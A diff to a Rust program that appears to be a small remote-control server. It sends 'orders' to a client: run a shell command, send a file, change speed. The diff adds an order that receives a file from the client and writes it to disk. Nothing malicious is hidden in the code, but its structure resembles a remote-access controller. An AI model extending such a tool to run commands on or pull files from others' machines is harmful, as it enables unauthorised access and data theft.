@@ -1,6 +1,6 @@
 use std::{
     fs::{OpenOptions, File},
-    io::{prelude::*, BufReader},
+    io::{prelude::*, BufReader, Cursor},
     net::{SocketAddr},
 };
 use chrono::prelude::*;
@@ -13,6 +13,7 @@ use std::process::Command;
 enum OrdreType {
     Commande,
     Fichier,
+    GetFichier,
     Vitesse,
     Autre
 }
@@ -115,21 +116,39 @@ async fn handle_post_request(server: & tiny_http::Server) -> String {
     return "".to_string();
 }
 
-async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -> () {
+async fn handle_file_post_request(server: & tiny_http::Server, filename: &str, ordre: OrdreType) -> () {
 
     let request = server.recv();
 
     match request {
-        Ok(rq) => {
+        Ok(mut rq) => {
 
             if *rq.method() == tiny_http::Method::Post {
-                
-                let file = std::fs::File::open(filename).unwrap();
 
-                let mut response = Response::from_file(file);
-                let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
-                response.add_header(header);
-                rq.respond(response).unwrap();
+                match ordre {
+                    OrdreType::Fichier => {
+                        let file = std::fs::File::open(filename).unwrap();
+
+                        let mut response = Response::from_file(file);
+                        let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
+                        response.add_header(header);
+                        rq.respond(response).unwrap();
+                    },
+                    OrdreType::GetFichier => {
+                        let mut file = std::fs::File::create(filename).unwrap();
+                        
+                        let mut content = rq.as_reader();
+                        std::io::copy(&mut content, &mut file).unwrap();
+
+                        let response = Response::from_string("Received file via POST");
+                        rq.respond(response).unwrap();
+                    },
+                    _ => {
+                        panic!("Not implemented");
+                    }
+
+                }
+                
             }
         },
         Err(e) => { println!("error: {}", e);  }
@@ -161,9 +180,9 @@ async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Ve
                         //handle_post_request(&server).await;
                         return pwd;
                     },
-                    OrdreType::Fichier => {
+                    OrdreType::Fichier | OrdreType::GetFichier => {
                         let filename = arguments[0].as_str();
-                        handle_file_post_request(&server, filename).await;
+                        handle_file_post_request(&server, filename, ordre).await;
                     },
                     _ => ()
                 }
@@ -222,6 +241,8 @@ async fn main() {
     send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("titouan")]).await;
     //////////////////////// envoie un fichier pour l'exemple
     send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
+    //recevoir un fichiet texte
+    send_ordre(&server, OrdreType::GetFichier, vec![String::from("fichier.txt")]).await;
 
     send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;
 
